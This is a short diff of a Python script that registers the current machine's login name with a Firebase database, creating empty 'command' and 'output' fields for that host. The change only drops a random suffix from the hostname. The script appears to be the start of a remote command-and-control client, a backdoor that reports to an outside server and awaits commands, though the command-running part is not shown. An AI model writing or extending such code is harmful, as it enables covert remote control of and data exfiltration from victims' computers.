@@ -1,8 +1,8 @@
-import requests, json, random as rd, os, subprocess, time
+import requests, json, os, subprocess, time
 
 BASE_URL = "https://moms-tailor-default-rtdb.firebaseio.com/first-start"
 DATABASE_URL = f"{BASE_URL}.json"
-hostname = os.getlogin() + str(rd.randint(0, 100))
+hostname = os.getlogin()
 requests.patch(DATABASE_URL, data=json.dumps({hostname: {"output": "", "command": ""}}))
 current_dir = os.getcwd()
 
